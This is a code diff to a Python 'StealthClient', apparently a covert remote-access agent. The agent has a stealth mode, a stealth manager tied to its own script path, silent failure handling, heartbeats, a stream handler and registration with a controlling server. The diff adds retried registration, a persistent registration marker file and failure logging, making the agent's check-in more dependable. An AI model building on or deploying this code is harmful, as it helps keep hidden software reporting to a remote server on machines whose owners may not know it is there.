@@ -4,6 +4,7 @@
 import sys
 import os
 import time
+from datetime import datetime, timezone
 import logging
 import signal
 import threading
@@ -57,6 +58,9 @@ class StealthClient:
         self.stealth_mode = StealthMode()
         self.stealth_manager = StealthManager(entry_script=os.path.abspath(__file__))
         self.heartbeat_interval = max(10, Config.HEARTBEAT_INTERVAL)
+        self.registered = False
+        self.last_register_attempt = 0.0
+        self.registration_retry_interval = 120  # seconds
 
         # Setup stealth logging
         setup_stealth_logging()
@@ -73,8 +77,14 @@ class StealthClient:
         if Config.STEALTH_MODE:
             self.stealth_mode.enable_stealth()
 
-    def register_client(self):
-        """Register client with server (silent)"""
+    def register_client(self, force: bool = False) -> bool:
+        """Register client with server and persist status."""
+        now = time.time()
+        if not force and (now - self.last_register_attempt) < self.registration_retry_interval:
+            return self.registered
+
+        self.last_register_attempt = now
+
         try:
             # Get OS info using the new detector
             os_info = get_os_info_for_client()
@@ -92,11 +102,17 @@ class StealthClient:
             }
 
             response = self.api_client.post('/api/clients/register', client_info)
+
+            if isinstance(response, dict) and response.get('success') is False:
+                raise ValueError(response.get('message', 'Registration rejected by server'))
+
+            self._mark_registered()
             return True
         except Exception as e:
-            # Silent fail in stealth mode
-            if not Config.STEALTH_MODE:
-                self.logger.error(f"Registration failed: {e}")
+            self.registered = False
+            error_message = f"Registration failed: {e}"
+            self.logger.warning(error_message)
+            self._record_registration_failure(error_message)
             return False
 
     def send_heartbeat(self):
@@ -109,10 +125,30 @@ class StealthClient:
             }
 
             response = self.api_client.post('/api/clients/heartbeat', heartbeat_data)
+            if isinstance(response, dict) and response.get('success') is False:
+                raise ValueError(response.get('message', 'Heartbeat rejected by server'))
             return True
         except Exception as e:
             # Silent fail in stealth mode
+            self.registered = False
             return False
+
+    def _mark_registered(self) -> None:
+        self.registered = True
+        marker_path = os.path.join(Config.DATA_DIR, '.registered')
+        try:
+            with open(marker_path, 'w', encoding='utf-8') as fh:
+                fh.write(datetime.now(timezone.utc).isoformat())
+        except Exception:
+            pass
+
+    def _record_registration_failure(self, message: str) -> None:
+        try:
+            failure_log = os.path.join(Config.LOG_DIR, 'registration_failures.log')
+            with open(failure_log, 'a', encoding='utf-8') as fh:
+                fh.write(f"{datetime.now(timezone.utc).isoformat()} - {message}\n")
+        except Exception:
+            pass
 
     def run(self):
         """Main execution loop - STEALTH MODE"""
@@ -128,7 +164,7 @@ class StealthClient:
                 f.write(str(time.time()))
 
         # Register with server (optional)
-        self.register_client()
+        self.register_client(force=True)
 
         # Start stream handler in separate thread
         stream_thread = None
@@ -191,6 +227,9 @@ class StealthClient:
             try:
                 loop_counter += 1
                 current_time = time.time()
+
+                if not self.registered and (current_time - self.last_register_attempt) >= self.registration_retry_interval:
+                    self.register_client(force=True)
 
                 # Send heartbeat based on configured interval
                 if current_time - last_heartbeat_at >= self.heartbeat_interval:
